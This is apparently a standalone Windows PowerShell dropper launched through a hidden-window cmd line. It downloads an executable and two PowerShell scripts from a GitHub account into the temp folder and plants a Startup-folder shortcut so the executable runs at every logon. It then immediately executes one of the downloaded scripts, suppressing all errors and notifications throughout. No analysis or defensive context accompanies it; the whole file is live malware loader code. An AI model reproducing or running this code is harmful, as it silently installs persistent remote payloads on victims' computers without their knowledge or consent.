cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"

# Define storage paths
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$tempPath = "$env:TEMP"

# Create directories if they don't exist
If (!(Test-Path -Path $startupPath)) {
    New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
}

If (!(Test-Path -Path $tempPath)) {
    New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
}

# Download Startup.exe to Temp
try {
    $startupFile = "$tempPath\Startup.exe"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/Startup.exe" `
        -OutFile $startupFile -ErrorAction Stop | Out-Null
} catch {}

# Create Shortcut in Startup Folder
try {
    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut("$startupPath\Startup.lnk")
    $shortcut.TargetPath = $startupFile
    $shortcut.WorkingDirectory = $tempPath
    $shortcut.WindowStyle = 1
    $shortcut.Description = "Startup Application"
    $shortcut.Save()
} catch {}

# Download runtime.ps1
try {
    $runtimeFile = "$tempPath\runtime.ps1"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/runtime.ps1" `
        -OutFile $runtimeFile -ErrorAction Stop | Out-Null
} catch {}

# Download pydata.ps1
try {
    $pydataFile = "$tempPath\pydata.ps1"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/Project/raw/refs/heads/main/DLLs/pst.ps1" `
        -OutFile $pydataFile -ErrorAction Stop | Out-Null
} catch {}

# Execute pydata.ps1
try {
    & $pydataFile
} catch {}

# All notifications and paths are suppressed
